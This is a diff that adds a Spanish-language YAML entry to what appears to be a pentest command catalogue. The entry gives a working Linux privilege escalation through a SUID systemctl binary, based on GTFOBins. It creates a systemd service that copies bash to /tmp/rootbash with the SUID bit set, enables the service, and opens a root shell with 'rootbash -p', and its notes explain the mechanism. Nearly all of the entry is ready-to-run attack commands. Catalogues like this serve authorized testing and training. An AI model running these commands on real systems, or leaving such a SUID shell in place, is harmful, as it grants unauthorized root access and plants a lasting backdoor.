@@ -1,0 +1,26 @@
+# Abuso de /bin/systemctl con SUID: registrar un servicio de systemd que corre como root (GTFOBins).
+tool: systemctl
+area: privesc-linux
+url: https://gtfobins.github.io/gtfobins/systemctl/
+commands:
+  - id: systemctl-suid-service
+    title: Root con systemctl SUID vía servicio de systemd
+    cmd: |
+      TF=$(mktemp).service
+      cat > "$TF" <<'EOF'
+      [Service]
+      Type=oneshot
+      ExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+      systemctl link "$TF"
+      systemctl enable --now "$TF"
+      /tmp/rootbash -p
+    phase: privesc
+    tags: [suid, privesc]
+    notes: >-
+      systemctl se lo pide a systemd (PID 1, root), así que un servicio sin User= corre como root. El
+      servicio copia bash con el bit SUID; ábrela con -p para conservar el euid. Lánzalo con el binario
+      que tenga el SUID (con su ruta completa si hace falta).
+    refs: [https://gtfobins.github.io/gtfobins/systemctl/]
